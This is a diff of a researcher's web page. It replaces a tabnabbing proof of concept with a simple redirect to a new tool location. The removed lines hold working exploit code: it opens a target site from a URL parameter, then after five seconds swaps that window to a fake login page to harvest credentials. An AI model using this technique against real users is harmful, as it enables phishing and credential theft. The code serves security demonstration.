@@ -1,61 +1,30 @@
-
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <style>
-        body {
-            background-color: white;
-            width: 100%;
-            height: 100vh;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            font-family: Arial, sans-serif;
-        }
-        #message {
-            color: black;
-            font-size: 20px;
-        }
-    </style>
+    <meta charset="UTF-8">
+    <title>Moved — COOP Tabnabbing PoC</title>
+    <!-- This page moved to /tools/coop/. GitHub Pages serves static files and
+         cannot return a real 301, so the redirect is done here: rel=canonical
+         tells crawlers where the page really lives, the meta refresh moves
+         browsers immediately, and the script preserves any ?target= that an
+         older report or link is still carrying. -->
+    <link rel="canonical" href="https://evanricafort.com/tools/coop/" />
+    <meta name="robots" content="noindex, follow" />
+    <meta http-equiv="refresh" content="0; url=/tools/coop/" />
     <script>
-        function tParam(qParam) {
-            const frmURL = window.location.search.substring(1);
-            const varURL = frmURL.split('&');
-            for (let i = 0; i < varURL.length; i++) {
-                const vParam = varURL[i].split('=');
-                if (vParam[0] === qParam) {
-                    return vParam[1];
-                }
-            }
-            window.location.href = "https://evanricafort.com";
-        }
-
-        function init() {
-            console.log("Redirecting to attacker's controlled site");
-            foo.location.href = "https://evanricafort.com/testlogin.html";
-        }
-
-        function launch() {
-            const target = tParam("target");
-            foo = window.open(target, "foo", "");
-            console.log("Target site opened successfully");
-            setTimeout(init, 5000);
-        }
-
-        function setup() {
-            const target = tParam("target");
-            document.body.addEventListener('click', launch);
-            const message = document.createElement('div');
-            message.id = 'message';
-            message.innerText = `If the site did not automatically redirect to ${target}, click anywhere in the white background`;
-            document.body.appendChild(message);
-            launch();
-        }
-
-        window.onload = setup;
-</script>
+        (function () {
+            var search = window.location.search || '';
+            window.location.replace('/tools/coop/' + search);
+        })();
+    </script>
+    <style>
+        body { font-family: Inter, system-ui, -apple-system, "Segoe UI", sans-serif;
+               background: #0b0f19; color: #e5e7eb; min-height: 100vh; margin: 0;
+               display: flex; align-items: center; justify-content: center; text-align: center; padding: 1rem; }
+        a { color: #a5b4fc; }
+    </style>
 </head>
-<body></body>
+<body>
+    <p>This page has moved to <a href="/tools/coop/">/tools/coop/</a>.</p>
+</body>
 </html>
